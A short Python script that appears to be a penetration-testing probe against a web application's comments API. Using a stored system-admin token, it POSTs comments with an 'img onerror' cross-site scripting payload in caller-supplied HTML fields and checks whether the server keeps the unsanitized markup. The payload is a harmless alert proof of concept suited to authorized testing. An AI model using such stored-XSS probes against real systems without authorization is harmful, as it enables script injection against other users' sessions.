import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def post(body):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X','POST',H+'/api/v1/comments',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXH'+uuid.uuid4().hex[:5]
print("=== does the API accept a caller-supplied message_html (bypassing client sanitizer)? ===")
cases=[
 ('html-live', {'message_raw':f'<img src=x onerror=alert(1)>{tag}',
                'message_html':f'<img src=x onerror=alert(1)>{tag}'}),
 ('html-bold', {'message_raw':f'<b>{tag}</b>','message_html':f'<b>{tag}</b>'}),
 ('raw-only',  {'message_raw':f'<img src=x onerror=alert(1)>{tag}'}),
]
for label,extra in cases:
    body={"comment":{"type":"Comment","commentable_type":"ExceptionRequest",
                     "commentable_id":33, **extra}}
    c,b=post(body)
    print(f"\n  {label:12} POST={c}")
    if c in ('200','201'):
        try:
            o=json.loads(b)['comments'][0]
            print(f"    id={o['id']} html={o.get('message_html')!r} raw={str(o.get('message_raw'))[:60]!r}")
        except Exception as e: print("   ",b[:120])
    else: print(f"    {b[:100]}")
